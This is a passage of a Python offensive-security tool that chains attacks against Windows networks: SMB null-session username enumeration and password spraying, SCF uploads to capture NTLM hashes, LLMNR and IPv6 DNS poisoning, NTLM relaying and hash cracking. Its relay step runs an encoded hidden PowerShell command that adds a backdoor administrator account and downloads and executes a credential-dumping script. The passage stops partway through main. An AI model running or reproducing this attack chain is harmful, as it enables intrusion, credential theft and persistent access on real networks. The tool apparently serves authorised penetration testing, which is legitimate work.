#!/usr/bin/env python3

import re
import os
import sys
import time
import string
import signal
import random
import asyncio
import argparse
import functools
import netifaces
from datetime import datetime
from itertools import zip_longest
from libnmap.process import NmapProcess
from asyncio.subprocess import PIPE, STDOUT
from netaddr import IPNetwork, AddrFormatError
from libnmap.parser import NmapParser, NmapParserException
from subprocess import Popen, PIPE, check_output, CalledProcessError

# debug
from IPython import embed

# Prevent JTR error in VMWare
os.environ['CPUID_DISABLE'] = '1'

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
    parser.add_argument("-p", "--password-list", help="Path to password list file")
    parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/dns/crack] where the first 5 options correspond to attacks 1-5")
    parser.add_argument("-t", "--time", default='10', help="Number of minutes to run the LLMNR/Responder attack; defaults to 10m")
    return parser.parse_args()

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        try:
            report = NmapParser.parse_fromfile(args.xml)
        except FileNotFoundError:
            sys.exit('[-] Host file not found: {}'.format(args.xml))
    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        sys.exit('[-] CIDR notation only in the host list e.g. 10.0.0.0/24')
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    sys.exit('[-] Error importing host list file. Are you sure you chose the right file?')
        report = nmap_scan(hosts)
    else:
        print('[-] Use the "-x [path/to/nmap-output.xml]" option if you already have an Nmap XML file \
or "-l [hostlist.txt]" option to run an Nmap scan with a hostlist file.')
        sys.exit()
    return report

def nmap_scan(hosts):
    '''
    Do Nmap scan
    '''
    nmap_args = '-sS --script smb-security-mode,smb-enum-shares -n --max-retries 5 -p 445 -oA smb-scan'
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/smb-scan.xml')

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    x = -.5
    while nmap_proc.is_running():
        i += 1
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print("[*] Nmap running: {} min".format(str(x)))
        time.sleep(1)

def run_nse_scripts(args, hosts, nse_scripts_run):
    '''
    Run NSE scripts if they weren't run in supplied Nmap XML file
    '''
    hosts = []
    if nse_scripts_run == False:
        if len(hosts) > 0:
            print("[*] Running missing NSE scripts")
            report = nmap_scan(hosts)
            hosts = get_hosts(args, report)
            return hosts

def get_share(l, share):
    '''
    Gets the share from Nmap output line
    e.g., \\\\192.168.1.10\\Pictures
    '''
    if l.startswith('  \\\\') and '$' not in l:
        share = l.strip()[:-1]
    return share

def parse_nse(hosts, args):
    '''
    Parse NSE script output
    '''
    smb_signing_disabled_hosts = []

    if 'scf' not in args.skip.lower():
        print('\n[*] Attack 2: SCF file upload to anonymously writeable shares for hash collection')

    for host in hosts:
        ip = host.address

        # Get SMB signing data
        for script_out in host.scripts_results:
            if script_out['id'] == 'smb-security-mode':
                if 'message_signing: disabled' in script_out['output']:
                    smb_signing_disabled_hosts.append(ip)

            # ATTACK 2: SCF file upload for hash capture
            if 'scf' not in args.skip.lower():
                if script_out['id'] == 'smb-enum-shares':
                    lines = script_out['output'].splitlines()
                    anon_share_found = write_scf_files(lines, ip, args)
                    local_scf_cleanup()

    if 'scf' not in args.skip.lower():
        if anon_share_found == False:
            print('[-] No anonymously writeable shares found')

    if len(smb_signing_disabled_hosts) > 0:
        for host in smb_signing_disabled_hosts:
            write_to_file('smb-signing-disabled-hosts.txt', host+'\n', 'a+')

def run_smbclient(server, share_name, action, scf_filepath):
    '''
    Run's impacket's smbclient.py for scf file attack
    '''
    smb_cmds_filename = 'smb-cmds.txt'
    smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
    write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
    smbclient_cmd = 'python2 submodules/impacket/examples/smbclient.py {} -f {}'.format(server, smb_cmds_filename)
    print("[*] Running '{}' with the verb '{}'".format(smbclient_cmd, action))
    stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
    return stdout, stderr

def write_scf_files(lines, ip, args):
    '''
    Writes SCF files to writeable shares based on Nmap smb-enum-shares output
    '''
    share = None
    anon_share_found = False
    scf_filepath = create_scf()

    for l in lines:
        share = get_share(l, share)
        if share:
            share_folder = share.split('\\')[-1]
            if 'Anonymous access:' in l or 'Current user access:' in l:
                access = l.split()[-1]
                if access == 'READ/WRITE':
                    anon_share_found = True
                    print('[+] Writeable share found at: '+share)
                    print('[*] Attempting to write SCF file to share')
                    action = 'put'
                    stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
                    stdout = stdout.decode('utf-8')
                    if 'Error:' not in stdout and len(stdout) > 1:
                        print('[+] Successfully wrote SCF file to: {}'.format(share))
                        write_to_file('logs/shares-with-SCF.txt', share+'\n', 'a+')
                    else:
                        stdout_lines = stdout.splitlines()
                        for line in stdout_lines:
                            if 'Error:' in line:
                                print('[-] Error writing SCF file: \n    '+line.strip())
    
    return anon_share_found

def create_scf():
    '''
    Creates scf file and smbclient.py commands file
    '''
    scf_filename = '@local.scf'

    if not os.path.isfile(scf_filename):
        scf_data = '[Shell]\r\nCommand=2\r\nIconFile=\\\\{}\\file.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop'.format(get_ip())
        write_to_file(scf_filename, scf_data, 'w+')

    cwd = os.getcwd()+'/'
    scf_filepath = cwd+scf_filename

    return scf_filepath

def local_scf_cleanup():
    '''
    Removes local SCF file and SMB commands file
    '''
    timestamp = str(time.time())
    scf_file = '@local.scf'
    smb_cmds_file = 'smb-cmds.txt'
    shares_file = 'logs/shares-with-SCF.txt'

    if os.path.isfile(scf_file):
        os.remove('@local.scf')

    if os.path.isfile(smb_cmds_file):
        os.remove('smb-cmds.txt')

    if os.path.isfile(shares_file):
        os.rename(shares_file, shares_file+'-'+timestamp)

def get_hosts(args, report):
    '''
    Gets list of hosts with port 445 open
    and a list of hosts with smb signing disabled
    '''
    hosts = []

    print('[*] Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            # Get open services
            for s in host.services:
                if s.port == 445:
                    if s.state == 'open':
                        hosts.append(host)
    if len(hosts) == 0:
        sys.exit('[-] No hosts with port 445 open')

    return hosts

def coros_pool(worker_count, commands):
    '''
    A pool without a pool library
    '''
    coros = []
    if len(commands) > 0:
        while len(commands) > 0:
            for i in range(worker_count):
                # Prevents crash if [commands] isn't divisible by worker count
                if len(commands) > 0:
                    coros.append(get_output(commands.pop()))
                else:
                    return coros
    return coros

@asyncio.coroutine
def get_output(cmd):
    '''
    Performs async OS commands
    '''
    p = yield from asyncio.create_subprocess_shell(cmd, stdout=PIPE, stderr=PIPE)
    # Output returns in byte string so we decode to utf8
    return (yield from p.communicate())[0].decode('utf8')

def async_get_outputs(loop, commands):
    '''
    Asynchronously run commands and get get their output in a list
    '''
    output = []

    if len(commands) == 0:
        return output

    # Get commands output in parallel
    worker_count = len(commands)
    if worker_count > 10:
        worker_count = 10

    # Create pool of coroutines
    coros = coros_pool(worker_count, commands)

    # Run the pool of coroutines
    if len(coros) > 0:
        output += loop.run_until_complete(asyncio.gather(*coros))

    return output

def create_cmds(hosts, cmd):
    '''
    Creates the list of comands to run
    cmd looks likes "echo {} && rpcclient ... {}"
    '''
    commands = []
    for host in hosts:
        # Most of the time host will be Nmap object but in case of null_sess_hosts
        # it will be a list of strings (ips)
        if type(host) is str:
            ip = host
        else:
            ip = host.address
        formatted_cmd = 'echo {} && '.format(ip) + cmd.format(ip)
        commands.append(formatted_cmd)
    return commands

def get_null_sess_hosts(output):
    '''
    Gets a list of all hosts vulnerable to SMB null sessions
    '''
    null_sess_hosts = {}
    # output is a list of rpcclient output
    for out in output:
        if 'Domain Name:' in out:
            out = out.splitlines()
            ip = out[0]
                         # Just get domain name
            dom = out[1].split()[2]
                         # Just get domain SID
            dom_sid = out[2].split()[2]
            null_sess_hosts[ip] = (dom, dom_sid)

    return null_sess_hosts

def get_AD_domains(null_sess_hosts):
    '''
    Prints the unique domains
    '''
    uniq_doms = []

    for key,val in null_sess_hosts.items():
        dom_name = val[0]

        if dom_name not in uniq_doms:
            uniq_doms.append(dom_name)

    if len(uniq_doms) > 0:
        for d in uniq_doms:
            print('[+] Domain found: ' + d) 

    return uniq_doms

def get_usernames(ridenum_output, prev_users):
    '''
    Gets usernames from ridenum output
    ip_users is dict that contains username + IP info
    prev_users is just a list of the usernames to prevent duplicate bruteforcing
    '''
    ip_users = {}

    for host in ridenum_output:
        out_lines = host.splitlines()
        ip = out_lines[0]
        for line in out_lines:
                                          # No machine accounts
            if 'Account name:' in line and "$" not in line:
                user = line.split()[2].strip()
                if user not in prev_users:
                    prev_users.append(user)
                    print('[+] User found: ' + user)

                    if ip in ip_users:
                        ip_users[ip] += [user]
                    else:
                        ip_users[ip] = [user]

    return ip_users, prev_users

def write_to_file(filename, data, write_type):
    '''
    Write data to disk
    '''
    with open(filename, write_type) as f:
        f.write(data)

def create_brute_cmds(ip_users, passwords):
    '''
    Creates the bruteforce commands
    ip_users = {ip:[user1,user2,user3]}
    ip_users should already be unique and no in prev_users
    '''
    cmds = []

    for ip in ip_users:
        for user in ip_users[ip]:
            rpc_user_pass = []
            for pw in passwords:
                cmd = "echo {} && rpcclient -U \"{}%{}\" {} -c 'exit'".format(ip, user, pw, ip)
                # This is so when you get the output from the coros
                # you get the username and pw too
                cmd2 = "echo '{}' ".format(cmd)+cmd
                cmds.append(cmd2)

    return cmds

def log_users(user):
    '''
    Writes users found to log file
    '''
    with open('found-users.txt', 'a+') as f:
        f.write(user+'\n')

def create_passwords(args):
    '''
    Creates the passwords based on default AD requirements
    or user-defined values
    '''
    if args.password_list:
        with open(args.password_list, 'r') as f:
            # We have to be careful with .strip()
            # because password could contain a space
            passwords = [line.rstrip() for line in f]
    else:
        season_pw = create_season_pw()
        other_pw = "P@ssw0rd"
        passwords = [season_pw, other_pw]

    return passwords

def create_season_pw():
    '''
    Turn the date into the season + the year
    '''
    # Get the current day of the year
    doy = datetime.today().timetuple().tm_yday
    year = str(datetime.today().year)

    spring = range(80, 172)
    summer = range(172, 264)
    fall = range(264, 355)
    # winter = everything else

    if doy in spring:
        season = 'Spring'
    elif doy in summer:
        season = 'Summer'
    elif doy in fall:
        season = 'Fall'
    else:
        season = 'Winter'

    season_pw = season+year
    return season_pw

def parse_brute_output(brute_output, prev_creds):
    '''
    Parse the chunk of rpcclient attempted logins
    '''
    # prev_creds = ['ip\user:password', 'SMBv2-NTLMv2-SSP-1.2.3.4.txt']
    pw_found = False

    for line in brute_output:
        # Missing second line of output means we have a hit
        if len(line.splitlines()) == 1:
            pw_found = True
            split = line.split()
            ip = split[1]
            dom_user_pwd = split[5].replace('"','').replace('%',':')
            prev_creds.append(dom_user_pwd)
            host_dom_user_pwd = ip+'\\'+dom_user_pwd

            duplicate = check_found_passwords(dom_user_pwd)
            if duplicate == False:
                print('[!] Password found! '+dom_user_pwd)
                log_pwds([dom_user_pwd])

    if pw_found == False:
        print('[-] No reverse bruteforce password matches found')

    return prev_creds

def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
    '''
    Performs SMB reverse brute
    '''
    # {ip:'domain name: xxx', 'domain sid: xxx'}
    null_sess_hosts = {}
    dom_cmd = 'rpcclient -U "" {} -N -c "lsaquery"'
    dom_cmds = create_cmds(hosts, dom_cmd)

    print('\n[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
    print('[*] Checking for null SMB sessions')
    print('[*] Example command that will run: '+dom_cmds[0].split('&& ')[1])

    rpc_output = async_get_outputs(loop, dom_cmds)
    if rpc_output == None:
        print('[-] Error attempting to look up null SMB sessions')
        return

    # {ip:'domain_name', 'domain_sid'}
    chunk_null_sess_hosts = get_null_sess_hosts(rpc_output)

    # Create master list of null session hosts
    null_sess_hosts.update(chunk_null_sess_hosts)
    if len(null_sess_hosts) == 0:
        print('[-] No null SMB sessions available')
        return
    else:
        null_hosts = []
        for ip in null_sess_hosts:
            print('[+] Null session found: {}'.format(ip))
            null_hosts.append(ip)

    domains = get_AD_domains(null_sess_hosts)

    # Gather usernames using ridenum.py
    print('[*] Checking for usernames. This may take a bit...')
    ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
    ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
    print('[*] Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
    ridenum_output = async_get_outputs(loop, ridenum_cmds)
    if len(ridenum_output) == 0:
        print('[-] No usernames found')
        return

    # {ip:[username, username2], ip2:[username, username2]}
    ip_users, prev_users = get_usernames(ridenum_output, prev_users)

    # Creates a list of unique commands which only tests
    # each username/password combo 2 times and not more
    brute_cmds = create_brute_cmds(ip_users, passwords)
    print('[*] Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
    brute_output = async_get_outputs(loop, brute_cmds)

    # Will always return at least an empty dict()
    prev_creds = parse_brute_output(brute_output, prev_creds)

    return prev_creds, prev_users, domains

def log_pwds(host_user_pwds):
    '''
    Turns SMB password data {ip:[usrr_pw, user2_pw]} into a string
    '''
    for host_user_pwd in host_user_pwds:
        line = host_user_pwd+'\n'
        write_to_file('found-passwords.txt', line, 'a+')

def edit_responder_conf(switch, protocols):
    '''
    Edit responder.conf
    '''
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    conf = 'submodules/Responder/Responder.conf'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        # Make sure the change we're making is necessary
        if re.search(p+' = '+opp_switch, filedata):
            filedata = filedata.replace(p+' = '+opp_switch, p+' = '+switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    ifaces = []
    for iface in netifaces.interfaces():
    # list of ipv4 addrinfo dicts
        ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
        for entry in ipv4s:
            addr = entry.get('addr')
            if not addr:
                continue
            if not (iface.startswith('lo') or addr.startswith('127.')):
                ifaces.append(iface)

    # Probably will only find 1 interface, but in case of more just use the first one
    return ifaces[0]

def get_ip():
    iface = get_iface()
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def run_proc(cmd):
    '''
    Runs single commands
    ntlmrelayx needs the -c "powershell ... ..." cmd to be one arg tho
    '''
    # Set up ntlmrelayx commands
    # only ntlmrelayx has a " in it
    dquote_split = cmd.split('"')

    if len(dquote_split) > 1:
        cmd_split = dquote_split[0].split()
        ntlmrelayx_remote_cmd = dquote_split[1]
        cmd_split.append(ntlmrelayx_remote_cmd)
    else:
        cmd_split = cmd.split()

    # mitm6 cmd is 'mitm6' with no options
    if 'mitm6' in cmd_split:
        filename = cmd_split[0] + '.log'
    else:
        for x in cmd_split:
            if 'submodules/' in x:
                filename = x.split('/')[-1] + '.log'
                break

    print('[*] Running: {}'.format(cmd))
    f = open('logs/'+filename, 'a+')
    proc = Popen(cmd_split, stdout=f, stderr=STDOUT)

    return proc

def create_john_cmd(hash_format, hash_file):
    '''
    Create JohnTheRipper command
    '''
    #./john --format=<format> --wordlist=<path> --rules <hashfile>
    cmd = []
    path = 'submodules/JohnTheRipper/run/john'
    cmd.append(path)
    form = '--format={}'.format(hash_format)
    cmd.append(form)
    wordlist = '--wordlist=submodules/10_million_password_list_top_1000000.txt'
    cmd.append(wordlist)
    cmd.append('--rules')
    cmd.append(hash_file)
    john_cmd = ' '.join(cmd)
    return john_cmd

def crack_hashes(hashes):
    '''
    Crack hashes with john
    The hashes in the func args include usernames, domains, and such
    hashes = {'NTLMv1':[hash1,hash2], 'NTLMv2':[hash1,hash2]}
    '''
    procs = []
    identifier = ''.join(random.choice(string.ascii_letters) for x in range(7))

    hash_folder = os.getcwd()+'/hashes'
    if not os.path.isdir(hash_folder):
        os.mkdir(hash_folder)

    if len(hashes) > 0:
        for hash_type in hashes:
            filepath = hash_folder+'/{}-hashes-{}.txt'.format(hash_type, identifier)
            for h in hashes[hash_type]:
                write_to_file(filepath, h, 'a+')
            if 'v1' in hash_type:
                hash_format = 'netntlm'
            elif 'v2' in hash_type:
                hash_format = 'netntlmv2'
            john_cmd = create_john_cmd(hash_format, filepath)
            try:
                john_proc = run_proc(john_cmd)
            except FileNotFoundError:
                print('[-] Error running john for password cracking, \
                       try: cd submodules/JohnTheRipper/src && ./configure && make')
            procs.append(john_proc)

    return procs

def parse_john_show(out, prev_creds):
    '''
    Parses "john --show output"
    '''
    for line in out.splitlines():
        line = line.decode('utf8')
        line = line.split(':')
        if len(line) > 3:
            user = line[0]
            pw = line[1]
            host = line[2]
            host_user_pwd = host+'\\'+user+':'+pw
            if host_user_pwd not in prev_creds:
                prev_creds.append(host_user_pwd)
                duplicate = check_found_passwords(host_user_pwd)
                if duplicate == False:
                    print('[!] Password found! '+host_user_pwd)
                    log_pwds([host_user_pwd])

    return prev_creds

def get_cracked_pwds(prev_creds):
    '''
    Check for new cracked passwords
    '''
    hash_folder = os.getcwd()+'/hashes'
    if os.path.isdir(hash_folder):
        dir_contents = os.listdir(os.getcwd()+'/hashes')

        for x in dir_contents:
            if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
                out = check_output('submodules/JohnTheRipper/run/john --show hashes/{}'.format(x).split())
                prev_creds = parse_john_show(out, prev_creds)

    return prev_creds

def check_found_passwords(host_user_pwd):
    '''
    Checks found-passwords.txt to prevent duplication
    '''
    fname = 'found-passwords.txt'
    if os.path.isfile(fname):
        with open(fname, 'r') as f:
            data = f.read()
            if host_user_pwd in data:
                return True

    return False

def start_responder_llmnr():
    '''
    Start Responder alone for LLMNR attack
    '''
    edit_responder_conf('On', ['HTTP', 'SMB'])
    iface = get_iface()
    resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
    resp_proc = run_proc(resp_cmd)
    print('[*] Responder-Session.log:')
    return resp_proc

def run_relay_attack():
    '''
    Start ntlmrelayx for ntlm relaying
    '''
    iface = get_iface()
    edit_responder_conf('Off', ['HTTP', 'SMB'])
    resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
    resp_proc = run_proc(resp_cmd)

# net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
    relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
                ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt -wa 3'
                ' -c "powershell -nop -exec bypass -w hidden -enc '
                'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
    ntlmrelay_proc = run_proc(relay_cmd)

    return resp_proc, ntlmrelay_proc

def follow_file(thefile):
    '''
    Works like tail -f
    Follows a constantly updating file
    '''
    thefile.seek(0,2)
    while True:
        line = thefile.readline()
        if not line:
            time.sleep(0.1)
            continue
        yield line

def check_ntlmrelay_error(line, file_lines):
    '''
    Checks for ntlmrelay errors
    '''
    if 'Traceback (most recent call last):' in line:
        print('[-] Error running ntlmrelayx:\n')
        for l in file_lines:
            print(l.strip())
        print('\n[-] Hit CTRL-C to quit')
        return True
    else:
        return False

def format_mimi_data(dom, user, auth, hash_or_pw, prev_creds):
    '''
    Formats the collected mimikatz data and logs it
    '''
    dom_user_pwd = dom+'\\'+user+':'+auth

    if dom_user_pwd not in prev_creds:
        prev_creds.append(dom_user_pwd)
        duplicate = check_found_passwords(dom_user_pwd)
        if duplicate == False:
            print('[!] {} found! {}'.format(hash_or_pw, dom_user_pwd))
            log_pwds([dom_user_pwd])

    return prev_creds

def parse_mimikatz(prev_creds, mimi_data, line):
    '''
    Parses mimikatz output for usernames and passwords
    '''
    splitl = line.split(':')
    user = None
    dom = None
    ntlm = None

    if "* Username" in line:
        if mimi_data['user']:
            user = mimi_data['user']
            if user != '(null)' and mimi_data['dom']:
                dom = mimi_data['dom']
                # Prevent (null) and hex passwords from being stored
                if mimi_data['pw']:
                    prev_creds = format_mimi_data(dom, user, mimi_data['pw'], 'Password', prev_creds)
                elif mimi_data['ntlm']:
                    prev_creds = format_mimi_data(dom, user, mimi_data['ntlm'], 'Hash', prev_creds)

        user = splitl[-1].strip()
        if user != '(null)':
            mimi_data['user'] = user
        mimi_data['dom'] = None
        mimi_data['ntlm'] = None
        mimi_data['pw'] = None
    elif "* Domain" in line:
        mimi_data['dom'] = splitl[-1].strip()
    elif "* NTLM" in line:
        ntlm = splitl[-1].strip()
        if ntlm != '(null)':
            mimi_data['ntlm'] = splitl[-1].strip()
    elif "* Password" in line:
        pw = splitl[-1].strip()
        if pw != '(null)' and pw.count(' ') < 15:
            mimi_data['pw'] = splitl[-1].strip()

    return prev_creds, mimi_data

def parse_responder_log(args, prev_lines, prev_creds):
    '''
    Gets and cracks responder hashes
    Avoids getting and cracking previous hashes
    '''
    new_lines = []

    # Print responder-session.log output so we know it's running
    path = 'submodules/Responder/logs/Responder-Session.log'
    if os.path.isfile(path):
        with open(path, 'r') as f:
            contents = f.readlines()

            for line in contents:
                if line not in prev_lines:
                    new_lines.append(line)
                    line = line.strip()
                    print('    [Responder] '+line)
                    prev_creds, new_hash = get_responder_hashes(line, prev_creds)

                    if new_hash:
                        if 'crack' not in args.skip.lower():
                            john_proc = crack_hashes(new_hash)

    prev_creds = get_cracked_pwds(prev_creds)

    return prev_creds, new_lines

def get_responder_hashes(line, prev_creds):
    '''
    Parse responder to get usernames and IPs for 2 pw bruteforcing
    '''
    hash_id = ' Hash     : '
    new_hash = None

    # We add the username in form of 'LAB\user' to prev_creds to prevent duplication
    if hash_id in line:
        ntlm_hash = line.split(hash_id)[-1].strip()+'\n'
        hash_split = ntlm_hash.split(':')
        user = hash_split[2]+'\\'+hash_split[0]

        if user not in prev_creds:
            prev_creds.append(user)
            print('[+] Hash found for {}!'.format(user))
            if ntlm_hash.count(':') == 5:
                new_hash = {'NTLMv2':[ntlm_hash]}
            elif ntlm_hash.count(':') == 4:
                new_hash = {'NTLMv1':[ntlm_hash]}

    return prev_creds, new_hash

def cleanup_responder(resp_proc, prev_creds):
    '''
    Kill responder and move the log file
    '''
    resp_proc.kill()
    path = 'submodules/Responder/logs/Responder-Session.log'
    timestamp = str(time.time())
    os.rename(path, path+'-'+timestamp)
    prev_creds = get_cracked_pwds(prev_creds)

    return prev_creds

def cleanup_mitm6(mitm6_proc):
    '''
    SIGINT mitm6
    '''
    pid = mitm6_proc.pid
    os.kill(pid, signal.SIGINT)
    if not mitm6_proc.poll():
        print('[*] Waiting on mitm6 to cleanly shut down...')

    arp_file = 'arp.cache'
    if os.path.isfile(arp_file):
        os.remove(arp_file)

def get_user_from_ntlm_hash(ntlm_hash):
    '''
    Gets the username in form of LAB\\uame from ntlm hash
    '''
    hash_split = ntlm_hash.split(':')
    user = hash_split[2]+'\\'+hash_split[0]

    return user

def parse_ntlmrelay_line(line, successful_auth, prev_creds, args):
    '''
    Parses ntlmrelayx.py's output
    '''
    hashes = {}

    # check for errors
    if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
        # First few lines of mimikatz logo start with '   ' and have #### in them
        if '####' not in line and 'mimikatz_initOrClean ; CoInitializeEx' not in line:
            print('    '+line.strip())

    # ntlmrelayx output
    if re.search('\[.\]', line):
        print('    '+line.strip())

    # Only try to crack successful auth hashes
    if successful_auth == True:
        successful_auth = False
        netntlm_hash = line.split()[-1]+'\n'
        user = get_user_from_ntlm_hash(netntlm_hash)

        if user not in prev_creds:
            prev_creds.append(user)

            if netntlm_hash.count(':') == 5:
                hash_type = 'NTLMv2'
                hashes[hash_type] = [netntlm_hash]

            if netntlm_hash.count(':') == 4:
                hash_type = 'NTLMv1'
                hashes[hash_type] = [netntlm_hash]

        if len(hashes) > 0:
            if 'crack' not in args.skip.lower():
                john_procs = crack_hashes(hashes)

    if successful_auth == False:
        if ' SUCCEED' in line:
            successful_auth = True

    if 'Executed specified command on host' in line:
        ip = line.split()[-1]
        host_user_pwd = ip+'\\icebreaker:P@ssword123456'
        prev_creds.append(host_user_pwd)
        duplicate = check_found_passwords(host_user_pwd)
        if duplicate == False:
            print('[!] User created! '+host_user_pwd)
            log_pwds([host_user_pwd])

    return prev_creds, successful_auth

def run_ipv6_dns_poison():
    '''
    Runs mitm6 to poison DNS via IPv6
    '''
    cmd = 'mitm6'
    mitm6_proc = run_proc(cmd)

    return mitm6_proc

def do_ntlmrelay(prev_creds, args):
    '''
    Continuously monitor and parse ntlmrelay output
    '''
    mitm6_proc = None

    print('\n[*] Attack 4: NTLM relay with Responder and ntlmrelayx')
    resp_proc, ntlmrelay_proc = run_relay_attack()

    if 'dns' not in args.skip:
        print('\n[*] Attack 5: IPv6 DNS Poison')
        mitm6_proc = run_ipv6_dns_poison()

    ########## CTRL-C HANDLER ##############################
    def signal_handler(signal, frame):
        '''
        Catch CTRL-C and kill procs
        '''
        print('\n[-] CTRL-C caught, cleaning up and closing')

        # Kill procs
        cleanup_responder(resp_proc, prev_creds)
        ntlmrelay_proc.kill()

        # Cleanup hash files
        cleanup_hash_files()

        # Clean up SCF file
        remote_scf_cleanup()

        # Kill mitm6
        if mitm6_proc:
            cleanup_mitm6(mitm6_proc)

        sys.exit()

    signal.signal(signal.SIGINT, signal_handler)
    ########## CTRL-C HANDLER ##############################

    mimi_data = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
    print('\n[*] ntlmrelayx.py output:')
    ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
    file_lines = follow_file(ntlmrelay_file)

    successful_auth = False
    for line in file_lines:
        # Parse ntlmrelay output
        prev_creds, successful_auth = parse_ntlmrelay_line(line, successful_auth, prev_creds, args)
        # Parse mimikatz output
        prev_creds, mimi_data = parse_mimikatz(prev_creds, mimi_data, line)

def check_for_nse_scripts(hosts):
    '''
    Checks if both NSE scripts were run
    '''
    sec_run = False
    enum_run = False

    for host in hosts:
        ip = host.address

        # Get SMB signing data
        for script_out in host.scripts_results:
            if script_out['id'] == 'smb-security-mode':
                sec_run = True

            if script_out['id'] == 'smb-enum-shares':
                enum_run = True

    if sec_run == False or enum_run == False:
        return False
    else:
        return True

def remote_scf_cleanup():
    '''
    Deletes the scf file from the remote shares
    '''
    path = 'logs/shares-with-SCF.txt'
    if os.path.isfile(path):
        with open(path) as f:
            lines = f.readlines()
            for l in lines:
                # Returns '['', '', '10.1.1.0', 'path/to/share\n']
                split_line = l.split('\\', 3)
                ip = split_line[2]
                share_folder = split_line[3].strip()
                action = 'rm'
                scf_filepath = '@local.scf'
                stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)

def cleanup_hash_files():
    '''
    Puts all the hash files of each type into one file
    '''
    resp_hash_folder = os.getcwd()+'/submodules/Responder/logs'
    hash_folder = os.getcwd()+'/hashes'


    for fname in os.listdir(resp_hash_folder):
        if re.search('v(1|2).*\.txt', fname):

            if not os.path.isdir(hash_folder):
                os.mkdir(hash_folder)

            os.rename(resp_hash_folder+'/'+fname, hash_folder+'/'+fname)

def main(report, args):
    '''
    Performs:
        SCF file upload for hash collection
        SMB reverse bruteforce
        Responder LLMNR poisoning
        SMB relay
        Hash cracking
    '''
    prev_creds = []
    prev_users = []
    loop = asyncio.get_event_loop()

    passwords = create_passwords(args)

    # Returns a list of Nmap object hosts
    # So you must use host.address, for example, to get the ip
    hosts = get_hosts(args, report)

    if len(hosts) > 0:
        nse_scripts_run = check_for_nse_scripts(hosts)

        # If Nmap XML shows that one or both NSE scripts weren't run, do it now
        if nse_scripts_run == False:
            hosts = run_nse_scripts(args, hosts)

        for h in hosts:
            print('[+] SMB open: {}'.format(h.address))

        # ATTACK 1: RID Cycling into reverse bruteforce
        if 'rid' not in args.skip.lower():
            prev_creds, prev_users, domains = smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users)

        # ATTACK 2: SCF file upload to writeable shares
        parse_nse(hosts, args)

    else:
        print('[-] No hosts with port 445 open. \
                   Skipping all attacks except LLMNR/NBNS/mDNS poison attack with Responder.py')

    # ATTACK 3: LLMNR poisoning
